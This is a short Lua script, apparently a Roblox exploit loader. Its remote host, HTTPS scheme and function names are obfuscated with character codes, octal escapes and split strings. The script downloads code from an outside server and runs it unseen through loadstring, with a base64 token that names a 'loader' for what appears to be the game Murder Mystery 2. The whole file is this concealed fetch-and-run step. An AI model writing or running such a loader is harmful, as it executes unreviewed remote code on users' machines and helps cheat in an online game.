local _host = string.char(112,114,111,106,101,99,116,45,114,101,118,101,114,115,101,46,111,114,103)
local _scheme = "\104\116\116\112\115\58\47\47"
local _prefix = _scheme .. "api." .. _host .. "/run/"
local _token = "eyJpZCI6ImVlZTg1YjI5LWYyNDItNDEwMS05ZDkxLTUwMjlhMDhmYWQxYyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJuZXd1aSJ9fQ"
local _url = _prefix .. _token

local _load = _G["loa".."dstr".."ing"]
local _get = game["Ht".."tp".."G".."et"]

local _success, _chunk = pcall(function()
    return _get(_url)
end)

if _success and _chunk and #_chunk > 0 then
    local _fn, _err = _load(_chunk)
    if _fn then
        pcall(_fn)
    else
        warn("Failed to load script: " .. tostring(_err))
    end
else
    warn("HTTP request failed! (Error 260 or API down).")
end
